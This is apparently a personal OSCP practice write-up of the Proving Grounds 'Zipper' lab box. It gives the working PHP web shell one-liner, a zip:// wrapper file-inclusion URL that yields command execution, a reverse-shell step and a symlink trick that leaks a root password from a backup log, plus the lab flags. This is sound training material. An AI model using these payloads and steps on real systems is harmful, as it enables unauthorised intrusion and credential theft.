---
Date: 2024-10-19
Course: "[[OSCP]]"
Platform: PG-Practice
Category: Linux
Difficulty: Hard
Status: In progress
IP: 192.168.111.229
Writeup: https://medium.com/@ardian.danny/oscp-practice-series-62-proving-grounds-zipper-b49a52ed8e38
---
# Zipper
This entire box was a shitshow from start to finish - I lost count of how many times I reverted it. Lessons learned? Probably to walk the fuck away if you've been at a box for more than 2 hours and don't have initial access. 

I spent nearly 5 hours just trying to get a reverse shell on this, not because I was doing anything wrong, but because the box was broken beyond belief. I resorted to ping to check if it was still up every few minutes because I didn't trust any of it, and the frustration only grew when I finally got a reverse shell but couldn't upgrade from a dumb shell to anything useful. 

At that point I really did step away, hang washing, ride my bike and have lunch, and soon after I came back I realised the "dumb shell" issue was the same as I'd had on an earlier box, and the solution was to upload use a different PHP reverse shell. But I spent literally hours testing different PHP uploads before enough reverts finally fixed whatever was going on behind the scenes, so I needed the break to clear my head and summon the will to start testing new PHP revshells.

Thankfully the very next PHP revshell I uploaded (Ivan Sincek's) worked perfectly, and I could move forward with privesc. After all the bullshit of trying to get initial access, identifying the bachup script didn't take long, and it only took some gentle guidance from the walkthrough to pickup what needed to be done to get `root`.

For all the success of last weekend, this box throughly and repeatedly sat me on my ass, testing my frustration to the absolute limit - not because I could figure out what to do, but because it was so broken I couldn't do even the most basic things without it going down and refusing connections. So going forward, I'm setting a 2hour timelimit on initial access, and another 2 hours for privesc - if I can't manage either of those, then pressing on will have diminishing returns as I become more frustrated and start to make basic mistakes.

## Improved skills
- Time management
- Walking away if initial access isn't achieved within 2hrs
## Used tools
- nmap
- python
- pspy32

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN zipper.nmap 192.168.111.229 -v
```

Enumerated open TCP ports:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Zipper
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---
# Enumeration
## Port 22 - SSH (OpenSSH 8.2p1)
No enumeration conducted
## Port 80 - HTTP (Apache 2.4.41)
- Navigated to `http://192.168.111.229:80` and identified online zip archiver `Zipper`
![[Cybersecurity-Resources/images/Pasted image 20241019093604.png]]
- Ran `gobuster dir -u http://192.168.111.229 -w //usr/share/dirb/wordlists/big.txt` to identify web directories
![[Cybersecurity-Resources/images/Pasted image 20241019094203.png]]
- Ran `gobuster dir -u http://192.168.111.229 -w //usr/share/dirb/wordlists/big.txt -x php,html,txt` to identify PHP, TXT & HTML files
![[Cybersecurity-Resources/images/Pasted image 20241019113329.png]]

---
# Exploitation
## Lcoal File Inclusion
- Created `simple_cmd.php` to include PHP command `<?php system($_REQUEST["cmd"]); ?>`
![[Cybersecurity-Resources/images/Pasted image 20241019114213.png]]
- Uploaded `simple_cmd.php` to Zipper and identified zip file save to `http://192.168.111.229/uploads/upload_1729300477.zip`
![[Cybersecurity-Resources/images/Pasted image 20241019114703.png]]
- Navigated to `192.168.111.229/index.php?file=zip://uploads/upload_1729300477.zip%23simple_cmd&cmd=whoami` to obtain RCE via zip wrapper LFI.
![[Cybersecurity-Resources/images/Pasted image 20241019114951.png]]
- Uploaded `reverseshell.php` with embedded PHP reverse shell, and identified file uploaded to `http://192.168.111.229/uploads/upload_1729314505.zip`
![[Cybersecurity-Resources/images/Pasted image 20241019154026.png]]
- Started netcat listener on port `1234` and navigated to `http://192.168.111.229/index.php?file=zip://uploads/upload_1729314505.zip%23reverseshell` to obtain reverse shell
![[Cybersecurity-Resources/images/Pasted image 20241019153949.png]]

---
# Privilege Escalation
## Local Enumeration
- Ran `find / -name local.txt -type f 2>/dev/null` then ran `cat /var/www/local.txt` to print flag `7638c3497498d0b4f3f12eabd89f3269`
![[Cybersecurity-Resources/images/Pasted image 20241019154220.png]]
- Ran `cat /etc/passwd` to identify any other users
![[Cybersecurity-Resources/images/Pasted image 20241019154401.png]]
- Ran `sudo -l` to identify `sudo` privileges - password required
![[Cybersecurity-Resources/images/Pasted image 20241019154453.png]]
- Ran `crontab -l` to identify any crontab data - none found
![[Cybersecurity-Resources/images/Pasted image 20241019154626.png]]
- Ran `ls /var/mail` to check available mail - none found
![[Cybersecurity-Resources/images/Pasted image 20241019154731.png]]
- Navigated to `/var/www/html/uploads` & ran `ls -lah` - identified interesting file `enox.zip --> /root/secret`
![[Cybersecurity-Resources/images/Pasted image 20241019160605.png]]
- Uploaded `pspy32` and ran `timeout 2m ./pspy32` to identify any processes or scripts running
![[Cybersecurity-Resources/images/Pasted image 20241019160635.png]]
- Identified script `/opt/backup.sh` running as `root`
![[Cybersecurity-Resources/images/Pasted image 20241019160813.png]]
- Ran `cat /opt/backup.sh` to identify
```
password=`cat /root/secret`
```
![[Cybersecurity-Resources/images/Pasted image 20241019161447.png]]
## Privilege Escalation vector
- Ran `touch root.txt` to create file in `/var/www/html/uplaods` and ran `ln -s /root/secret root.txt` to link file to `/root/secret`
![[Cybersecurity-Resources/images/Pasted image 20241019161918.png]]
- Waited for script to run, then ran `cat /opt/backups/backup.log` to view `/root/secret` appended to log file, and identified credentials `WildCardsGoingWild`
![[Cybersecurity-Resources/images/Pasted image 20241019162242.png]]
- Ran `su` to switch to `root` and entered credential `WildCardsGoingWild` for password
![[Cybersecurity-Resources/images/Pasted image 20241019162340.png]]
- Ran `cat /root/proof.txt` to print flag `a1c4888b41fc7697e214d03584c54dd5`
![[Cybersecurity-Resources/images/Pasted image 20241019162623.png]]
---
# Trophy & Loot
`local.txt` = `7638c3497498d0b4f3f12eabd89f3269`
`proof.txt` = `a1c4888b41fc7697e214d03584c54dd5`